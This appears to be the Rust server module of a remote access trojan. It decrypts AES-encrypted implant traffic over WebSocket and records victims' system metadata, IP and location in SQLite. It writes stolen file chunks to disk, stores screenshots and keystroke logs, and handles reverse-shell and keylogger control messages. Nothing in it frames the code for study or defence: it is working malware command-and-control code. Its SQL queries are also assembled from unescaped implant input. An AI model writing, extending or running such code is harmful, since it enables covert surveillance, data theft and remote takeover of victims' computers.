// src/rat.rs
use aes::cipher::BlockDecrypt;
use base64::Engine;
use futures::{Sink, SinkExt, Stream, StreamExt};
use serde_json;
use sqlite::Connection;
use std::fmt;
use std::sync::Arc;
use std::time;
use std::{fs::OpenOptions, io::Write};
use tokio::net::TcpStream;
use tokio::sync::mpsc::{unbounded_channel, UnboundedReceiver, UnboundedSender};
use tokio::sync::Mutex;
use tokio_tungstenite::accept_async;
use tungstenite::protocol::Message;

use aes::cipher::{generic_array::GenericArray, typenum, KeyInit};
use aes::Aes256;

use tokio::time::timeout;

use crate::messages::{
  backend::ResponseType,
  common::{MessageEnvelope, MessageType, Metadata, MetadataWithId, ResponseStatus},
  file::{FileDownloadStatus, FileDownloadStatusData, FileTransferResult},
  heartbeat::{FirstBeat, HeartbeatType},
  keylogger::{KeylogData, KeyloggerResponse},
  rat::{C2RMessageType, R2CMessageType},
};

#[derive(Clone)]
pub struct Rat {
  pub id:                i32,
  pub version:           u32,
  pub conn:              Arc<Mutex<Connection>>,
  pub reader:            Arc<Mutex<dyn Stream<Item = Result<Message, tungstenite::Error>> + Unpin + Send>>,
  pub writer:            Arc<Mutex<dyn Sink<Message, Error = tungstenite::Error> + Unpin + Send>>,
  pub response_sender:   UnboundedSender<R2CMessageType>,
  pub response_receiver: Arc<Mutex<UnboundedReceiver<R2CMessageType>>>,
  pub key:               [u8; 32],
}

impl fmt::Display for Rat {
  fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result { write!(f, "Rat {{ id: {}, version: {} }}", self.id, self.version) }
}

impl Rat {
  /// Create a new Rat instance
  pub async fn new(version: u32, stream: TcpStream) -> Self {
    let ws_stream = accept_async(stream).await.expect("Failed to accept connection");
    let (mut write, mut read) = ws_stream.split();
    let conn = Connection::open("rats.db").expect("Failed to open database");

    let first_beat = read.next().await;
    // println!("First beat: {:?}", first_beat);
    let mut id = rand::random::<i32>().abs();
    let mut decoded_key_array: [u8; 32] = [0; 32];
    if let Some(Ok(Message::Text(first_beat))) = first_beat {
      // println!("First beat: {}", first_beat);
      if let Ok(MessageEnvelope {
        version: _,
        rat_id: _,
        message,
      }) = serde_json::from_str(&first_beat)
      {
        // println!("First beat message: {:#?}", message);
        if let MessageType::R2C(R2CMessageType::Heartbeat(HeartbeatType::First(FirstBeat {
          rat_id: Some(received_id),
          key,
          ..
        }))) = message
        {
          id = received_id;
          if let Ok(decoded_key) = hex::decode(&key) {
            if decoded_key.len() == 32 {
              decoded_key_array.copy_from_slice(&decoded_key);
            } else {
              eprintln!("Decoded key length is not 32 bytes");
            }
          } else {
            eprintln!("Failed to decode key");
          }

          // println!("Recived First beat: {}", first_beat);
        }
      } else {
        eprintln!("Failed to parse first beat message");
      }
    } else {
      eprintln!("Failed to receive first beat message");
    }
    println!("New WebSocket connection established with Rat: {}", id);
    let first = MessageEnvelope {
      version,
      rat_id: Some(id),
      message: MessageType::C2R(C2RMessageType::Heartbeat(HeartbeatType::First(FirstBeat {
        version,
        rat_id: Some(id),
        key: decoded_key_array.to_vec().iter().map(|b| format!("{:02x}", b)).collect(),
      }))),
    };
    println!("Sending first beat: {:#?}", first);
    let message = serde_json::to_string(&first).expect("Failed to serialize response");

    write.send(Message::Text(message)).await.expect("Failed to send message");

    let (response_sender, response_receiver) = unbounded_channel();

    Rat {
      id,
      version,
      conn: Arc::new(Mutex::new(conn)),
      reader: Arc::new(Mutex::new(read)),
      writer: Arc::new(Mutex::new(write)),
      response_sender,
      response_receiver: Arc::new(Mutex::new(response_receiver)),
      key: decoded_key_array,
    }
  }

  /// Handle incoming messages from the Rat
  pub async fn handle_messages(&self) {
    let mut read = self.reader.lock().await;
    let key = GenericArray::from_slice(&self.key);
    // let iv: GenericArray<u8, typenum::U16> = *GenericArray::from_slice(&self.iv);
    let cipher = Aes256::new(key);

    while let Some(message) = read.next().await {
      match message {
        Ok(msg) => {
          // Decrypt the message
          // let cipher = Aes256::new(&key);
          // println!("Deciphering Received message from Rat {}: {:?}", self.id, msg);
          if msg.is_ping() {
            let mut writer = self.writer.lock().await;
            // println!("Ponging message");
            let _ = writer.send(Message::Pong(msg.into_data())).await;
            continue;
          }
          let blocks = base64::engine::general_purpose::STANDARD
            .decode(&msg.into_text().unwrap_or("".to_string()))
            .expect("Failed to decode base64 data");

          let mut decrypted_message: Vec<u8> = vec![0; blocks.len()];
          let mut all_blocks: Vec<GenericArray<u8, typenum::U16>> =
            blocks.chunks(16).map(|chunk| GenericArray::clone_from_slice(chunk)).collect();
          cipher.decrypt_blocks(&mut all_blocks);
          for block in all_blocks {
            decrypted_message.extend_from_slice(&block);
          }
          // let mut last_byte = 0;
          let mut unpadded_message = decrypted_message
            .iter()
            .filter(|&&x| x != "\0".as_bytes()[0])
            //   .map(|&x| {
            //   if "}".as_bytes()[0] != x {
            //     last_byte += 1;
            //   }
            //   x
            //   })
            .cloned()
            .collect::<Vec<u8>>();

          if let Some(first_index) = unpadded_message.iter().position(|&x| x == b'{') {
            if let Some(last_index) = unpadded_message.iter().rposition(|&x| x == b'}') {
              unpadded_message = unpadded_message[first_index..=last_index].to_vec();
              // println!("first_index: {:?}, last_index: {:?}", first_index, last_index);
            } else {
              eprintln!("No closing `}}` found in the message");
            }
          } else {
            eprintln!("No opening `{{` found in the message");
          }

          // println!("unpaded message: {:?}", String::from_utf8(unpadded_message.to_vec()).unwrap());

          if let Some(response) = self
            .handle_received_message(Message::Text(
              String::from_utf8(unpadded_message).expect("Failed to convert decrypted message to string"),
            ))
            .await
          {
            // Send the response through the channel
            match response {
              R2CMessageType::CommandResponse(_) => {
                println!("Sending response {}: {:#?}", self.id, response);
                if let Err(e) = self.response_sender.send(response) {
                  eprintln!("Failed to send response: {}", e);
                }
              }
              R2CMessageType::FileDownloadComplete(_) => {
                println!("Sending response {}: {:#?}", self.id, response);
                if let Err(e) = self.response_sender.send(response) {
                  eprintln!("Failed to send response: {}", e);
                }
              }
              R2CMessageType::DirList(_) => {
                println!("Sending response {}: {:#?}", self.id, response);
                if let Err(e) = self.response_sender.send(response) {
                  eprintln!("Failed to send response: {}", e);
                }
              }
              R2CMessageType::Screenshot(_) => {
                println!("Sending response {}: {:#?}", self.id, response);
                if let Err(e) = self.response_sender.send(response) {
                  eprintln!("Failed to send response: {}", e);
                }
              }
              R2CMessageType::ReverseShellResponse(_) => {
                println!("Sending response {}: {:#?}", self.id, response);
                if let Err(e) = self.response_sender.send(response) {
                  eprintln!("Failed to send response: {}", e);
                }
              }
              R2CMessageType::KeyloggerResponse(_) => {
                println!("Sending response {}: {:#?}", self.id, response);
                if let Err(e) = self.response_sender.send(response) {
                  eprintln!("Failed to send response: {}", e);
                }
              }
              R2CMessageType::KeylogData(_) => {
                println!("Sending response {}: {:#?}", self.id, response);
                if let Err(e) = self.response_sender.send(response) {
                  eprintln!("Failed to send response: {}", e);
                }
              }
              _ => {
                println!("Not Redirecting response to the backend:");
                println!("Response type: {:?}", std::any::type_name::<R2CMessageType>());
              }
            }
          }
        }
        Err(e) => {
          eprintln!("Error receiving message: {}", e);
          break;
        }
      }
    }
    println!("Connection with Rat {} closed", self.id);
  }

  /// Handle a single received message
  async fn handle_received_message(&self, message: Message) -> Option<R2CMessageType> {
    let deserialized: Result<MessageEnvelope, _> = serde_json::from_str(&message.to_text().unwrap_or(""));

    // println!("Deserialized message: {:#?}", deserialized);

    match deserialized {
      Ok(message) => match message.message {
        MessageType::R2C(r2c_message) => {
          // Handle the message as before
          match r2c_message {
            R2CMessageType::Metadata(metadata) => {
              println!("Received metadata from Rat {}: {:?}", self.id, metadata);

              Some(R2CMessageType::Metadata(metadata))
            }

            R2CMessageType::Heartbeat(HeartbeatType::Regular(metadata)) => {
              println!("Received metadata from Rat {}: {:#?}", self.id, metadata);
              let conn = self.conn.lock().await;
              // let create_table = "
              // CREATE TABLE IF NOT EXISTS metadata (
              //   id TEXT PRIMARY KEY,
              //   os TEXT,
              //   cpu TEXT,
              //   cpu_usage TEXT,
              //   memory TEXT,
              //   memory_usage TEXT,
              //   storage TEXT,
              //   used_storage TEXT,
              //   user TEXT,
              //   timestamp TEXT,
              //   ip TEXT,
              //   location TEXT,
              //   hostname TEXT
              // );
              // ";
              // if let Err(e) = conn.execute(create_table) {
              // eprintln!("Failed to create metadata table: {}", e);
              // return None;
              // }

              let statement = format!(
                r#"INSERT INTO metadata (id, os, cpu, cpu_usage, memory, memory_usage, storage, used_storage, user, timestamp, ip, location, hostname) VALUES ('{}', '{}', '{}', '{}', '{}', '{}', '{}', '{}', '{}', '{}', '{}', '{}', '{}')
                ON CONFLICT(id) DO UPDATE SET
                os=excluded.os,
                cpu=excluded.cpu,
                cpu_usage=excluded.cpu_usage,
                memory=excluded.memory,
                memory_usage=excluded.memory_usage,
                storage=excluded.storage,
                used_storage=excluded.used_storage,
                user=excluded.user,
                timestamp=excluded.timestamp,
                ip=excluded.ip,
                location=excluded.location,
                hostname=excluded.hostname;"#,
                self.id,
                metadata.os,
                metadata.cpu,
                metadata.cpu_usage,
                metadata.memory,
                metadata.memory_usage,
                metadata.storage,
                metadata.used_storage,
                metadata.user,
                metadata.timestamp,
                metadata.ip,
                metadata.location,
                metadata.hostname
              );

              let mut retries = 0;
              loop {
                match conn.execute(&statement) {
                  Ok(_) => break,
                  Err(e) if e.to_string().contains("database is locked") && retries < 5 => {
                    retries += 1;
                    eprintln!("Database is locked, retrying... (attempt {})", retries);
                    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                  }
                  Err(e) => {
                    eprintln!("Failed to insert metadata: {}", e);
                    return None;
                  }
                }
              }

              Some(R2CMessageType::Heartbeat(HeartbeatType::Regular(metadata)))
            }

            R2CMessageType::CommandResponse(response) => {
              println!("Got Command response back: {:#?}", response);
              Some(R2CMessageType::CommandResponse(response))
            }

            R2CMessageType::FileDownloadChunk(chunk) => {
              println!("Got a File Chunk: Writing to desk");
              let data = base64::engine::general_purpose::STANDARD
                .decode(&chunk.data)
                .expect("Failed to decode base64 data");
              if let Err(e) = self
                .handle_file_download_result(
                  data,
                  format!(
                    "{}/{}|{}",
                    self.id,
                    chunk.transfer_id,
                    chunk.file_name.split("/").last().unwrap()
                  ),
                )
                .await
              {
                eprintln!("Failed to handle file download: {}", e);
              }

              let conn = self.conn.lock().await;
              let statement = format!(
                "INSERT INTO filedownloads (download_id, rat_id, file_path, timestamp, downloadedchunks, totalchunks) 
                  VALUES ('{}', '{}', '{}', '{}', '{}', '{}') 
                  ON CONFLICT(download_id) DO UPDATE SET 
                  downloadedchunks=excluded.downloadedchunks",
                chunk.transfer_id,
                self.id,
                chunk.file_name,
                time::SystemTime::now().duration_since(time::UNIX_EPOCH).unwrap().as_secs(),
                chunk.chunk_number,
                chunk.total_chunks
              );
              if let Err(e) = conn.execute(&statement) {
                eprintln!("Failed to insert file download entry: {}", e);
              }

              let message = if chunk.chunk_number == chunk.total_chunks {
                "File transfer complete".to_string()
              } else {
                format!("Chunk {}/{} received", chunk.chunk_number, chunk.total_chunks)
              };
              println!("Received file download chunk from Rat {}: {}", self.id, message);

              Some(R2CMessageType::FileDownloadComplete(FileTransferResult {
                transfer_id: chunk.transfer_id,
                status:      FileDownloadStatus::InProgress(FileDownloadStatusData {
                  rat_id:           self.id,
                  download_id:      chunk.transfer_id,
                  file_path:        chunk.file_name,
                  timestamp:        time::SystemTime::now().duration_since(time::UNIX_EPOCH).unwrap().as_secs(),
                  downloadedchunks: chunk.chunk_number,
                  totalchunks:      chunk.total_chunks,
                }),
                message:     message,
              }))
            }
            R2CMessageType::FileDownloadComplete(result) => {
              println!("Received file download complete from Rat {}: {:#?}", self.id, result);
              Some(R2CMessageType::FileDownloadComplete(result))
            }

            R2CMessageType::DirList(dir_list) => {
              // println!("Received directory list from Rat {}: {:#?}", self.id, dir_list);
              Some(R2CMessageType::DirList(dir_list))
            }
            R2CMessageType::Screenshot(screenshot) => {
              println!("Received screenshot from Rat {}: {:#?}", self.id, screenshot);
              match self.conn.lock().await.execute(format!(
                "INSERT INTO screenshots (id, data, timestamp) VALUES ('{}', '{}', '{}')",
                self.id, screenshot.data, screenshot.timestamp
              )) {
                Ok(_) => println!("Screenshot saved to database"),
                Err(e) => eprintln!("Failed to save screenshot to database: {}", e),
              }

              Some(R2CMessageType::Screenshot(screenshot))
            }
            R2CMessageType::ReverseShellResponse(state) => {
              println!("Reverse shell opened");
              Some(R2CMessageType::ReverseShellResponse(state))
            }
            R2CMessageType::KeyloggerResponse(response) => {
              println!("Keylogger response: {:#?}", response);
              Some(R2CMessageType::KeyloggerResponse(response))
            }
            R2CMessageType::KeylogData(keylog) => {
                println!("Keylogger data: {:#?}", keylog);
                // Store the keylog data in the database
                let conn = self.conn.lock().await;
                
                // First, make sure the keylogger table exists with the right schema
                let create_table = "
                    CREATE TABLE IF NOT EXISTS keylogs (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        rat_id INTEGER NOT NULL,
                        keystrokes TEXT NOT NULL,
                        statistics TEXT NOT NULL,
                        timestamp INTEGER NOT NULL
                    )";
                
                if let Err(e) = conn.execute(create_table) {
                    eprintln!("Failed to create keylogger table: {}", e);
                }
                
                // Serialize the keystroke data and statistics to JSON strings
                let keystrokes_json = serde_json::to_string(&keylog.keystrokes)
                    .unwrap_or_else(|_| "[]".to_string())
                    .replace("'", "''"); // Escape single quotes for SQL
                    
                let statistics_json = serde_json::to_string(&keylog.statistics)
                    .unwrap_or_else(|_| "{}".to_string())
                    .replace("'", "''"); // Escape single quotes for SQL
                
                // Current timestamp
                let now = time::SystemTime::now()
                    .duration_since(time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs();
                
                let statement = format!(
                    "INSERT INTO keylogs (rat_id, keystrokes, statistics, timestamp) VALUES ({}, '{}', '{}', '{}')",
                    self.id,
                    keystrokes_json,
                    statistics_json,
                    now
                );
                
                let mut retries = 0;
                loop {
                    match conn.execute(&statement) {
                        Ok(_) => {
                            println!("Keylog data saved to database");
                            break;
                        },
                        Err(e) if e.to_string().contains("database is locked") && retries < 5 => {
                            retries += 1;
                            eprintln!("Database is locked, retrying... (attempt {})", retries);
                            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                        },
                        Err(e) => {
                            eprintln!("Failed to save keylog data to database: {}", e);
                            break;
                        }
                    }
                }
                
                Some(R2CMessageType::KeylogData(keylog))
            }
            _ => {
              eprintln!("Unsupported message type from Rat {} | {:#?}", self.id, r2c_message);
              None
            }
          }
        }
        _ => {
          eprintln!("Unsupported message type from Rat {}", self.id);
          None
        }
      },
      Err(e) => {
        eprintln!(
          "Failed to deserialize message from Rat {}: {:?}\nError: {}",
          self.id,
          message.to_text().unwrap_or(""),
          e
        );
        // println!("Message: {:#?}", message);
        None
      }
    }
  }

  //   async fn reconnect(&self) -> Result<(), Box<dyn std::error::Error>> {
  //     let url = "ws://localhost:9001"; // Update with your WebSocket server URL
  //     loop {
  //         match tokio_tungstenite::connect_async(url).await {
  //             Ok((ws_stream, _)) => {
  //                 let (write, read) = ws_stream.split();
  //                 *self.writer.lock().await = Box::new(write);
  //                 *self.reader.lock().await = Box::new(read);
  //                 println!("Reconnected to the server");
  //                 break;
  //             }
  //             Err(e) => {
  //                 eprintln!("Reconnection failed: {}. Retrying in 5 seconds...", e);
  //                 tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
  //             }
  //         }
  //     }
  //     Ok(())
  //   }

  /// Send CLI command to the Rat
  pub async fn send_command(&self, message: MessageType) -> Result<ResponseType, Box<dyn std::error::Error>> {
    let message = MessageEnvelope {
      version: self.version,
      rat_id:  Some(self.id),
      message: message,
    };

    let message_json = serde_json::to_string(&message)?;
    println!("Sending command to Rat {}: {}", self.id, message_json);
    let mut ws_stream = self.writer.lock().await;

    match ws_stream.send(Message::Text(message_json.clone())).await {
      Ok(_) => println!("Command Sent"),
      Err(tungstenite::Error::ConnectionClosed) => {
        println!("Connection closed. Attempting to reconnect...");
      }
      Err(e) => return Err(Box::new(e)),
    }

    let mut receiver = self.response_receiver.lock().await;
    match timeout(tokio::time::Duration::from_secs(30), receiver.recv()).await {
      Ok(Some(response)) => {
        println!("Received response: {:#?}", response);
        return match response {
          R2CMessageType::CommandResponse(response) => Ok(ResponseType::CliResponse(response)),
          R2CMessageType::DirList(dir_list) => Ok(ResponseType::DirList(dir_list)),
          R2CMessageType::Screenshot(screenshot) => Ok(ResponseType::Screenshot(screenshot)),
          R2CMessageType::ReverseShellResponse(state) => Ok(ResponseType::ReverseShellResponse(state)),
          R2CMessageType::KeyloggerResponse(response) => Ok(ResponseType::KeyloggerResponse(response)),
          // R2CMessageType::KeylogData(keylog) => Ok(ResponseType::KeylogData(keylog)),


          _ => {
            eprintln!("Unexpected response received: {:#?}", response);
            Err("Unexpected response received".into())
          }
        };
      }
      Ok(None) => {
        eprintln!("No response received");
        return Err("No response received".into());
      }
      Err(_) => {
        eprintln!("Request timed out while waiting for response");
        return Err("Request timed out".into());
      }
    }

    // Err("No response received".into())
  }

  /// Request a file download from the RAT
  // pub async fn request_file_download(&self, path: FileTransferData) -> Result<(), Box<dyn std::error::Error>> {
  //   let message = MessageType::C2R(C2RMessageType::FileDownload(path));
  //   self.send_command(message).await
  // }

  pub async fn get_metadata(&self) -> MetadataWithId {
    print!("Fetching metadata for Rat {}", self.id);
    let conn = self.conn.lock().await;
    let query = format!(
      "SELECT os, cpu, cpu_usage, memory, memory_usage, storage, used_storage, user, timestamp, ip, location, hostname FROM metadata WHERE id = {}",
      self.id
    );
    println!("fetched rat metadata: {:?}", query);

    let mut metadata = MetadataWithId::default();

    for row in conn.prepare(query).unwrap().into_iter().map(|row| row.unwrap()) {
      println!("row: {:?}", row);
      metadata = MetadataWithId {
        ratId:        self.id,
        connected:    true,
        os:           row.read::<&str, _>(0).to_string(),
        cpu:          row.read::<&str, _>(1).parse().unwrap(),
        cpu_usage:    row.read::<&str, _>(2).parse().unwrap(),
        memory:       row.read::<&str, _>(3).parse().unwrap(),
        memory_usage: row.read::<&str, _>(4).parse().unwrap(),
        storage:      row.read::<&str, _>(5).parse().unwrap(),
        used_storage: row.read::<&str, _>(6).parse().unwrap(),
        user:         row.read::<&str, _>(7).to_string(),
        timestamp:    row.read::<&str, _>(8).parse().unwrap(),
        ip:           row.read::<&str, _>(9).to_string(),
        location:     row.read::<&str, _>(10).to_string(),
        hostname:     row.read::<&str, _>(11).to_string(),
      };
    }
    metadata
  }

  pub async fn get_download_status(&self, transfer_id: u32) -> FileDownloadStatusData {
    let conn = self.conn.lock().await;
    let query = format!(
      "SELECT download_id, file_path, timestamp, downloadedchunks, totalchunks FROM filedownloads WHERE download_id = '{}' AND rat_id = {}",
      transfer_id, self.id
    );
    println!("Fetching download status: {:?}", query);

    let mut result = FileDownloadStatusData::default();

    for row in conn.prepare(query).unwrap().into_iter().map(|row| row.unwrap()) {
      println!("row: {:?}", row);
      result = FileDownloadStatusData {
        rat_id:           self.id,
        download_id:      row.read::<&str, _>(0).parse().unwrap(),
        file_path:        row.read::<&str, _>(1).to_string(),
        timestamp:        row.read::<&str, _>(2).parse().unwrap(),
        downloadedchunks: row.read::<&str, _>(3).parse().unwrap(),
        totalchunks:      row.read::<&str, _>(4).parse::<u32>().unwrap() - 1,
      };
    }
    result
  }

  pub async fn get_downloaded_files(&self) -> Vec<FileDownloadStatusData> {
    let conn = self.conn.lock().await;
    let query = format!(
      "SELECT download_id, file_path, timestamp, downloadedchunks, totalchunks FROM filedownloads WHERE rat_id = {}",
      self.id
    );

    let mut result: Vec<FileDownloadStatusData> = Vec::new();

    for row in conn.prepare(query).unwrap().into_iter().map(|row| row.unwrap()) {
      println!("Downloaded file: {:?}", row);
      result.push(FileDownloadStatusData {
        rat_id:           self.id,
        download_id:      row.read::<&str, _>(0).parse().unwrap(),
        file_path:        row.read::<&str, _>(1).to_string(),
        timestamp:        row.read::<&str, _>(2).parse().unwrap(),
        downloadedchunks: row.read::<&str, _>(3).parse::<u32>().unwrap() + 1,
        totalchunks:      row.read::<&str, _>(4).parse::<u32>().unwrap(),
      });
    }
    result
  }

  /// Handle file download data received from the RAT
  async fn handle_file_download_result(&self, data: Vec<u8>, filename: String) -> Result<(), std::io::Error> {
    let mut file = OpenOptions::new().create(true).append(true).open({
      let path = format!("downloads/{}", filename);
      if let Some(parent) = std::path::Path::new(&path).parent() {
        std::fs::create_dir_all(parent)?;
      }
      path
    })?;

    file.write_all(&data)?;
    Ok(())
  }
}
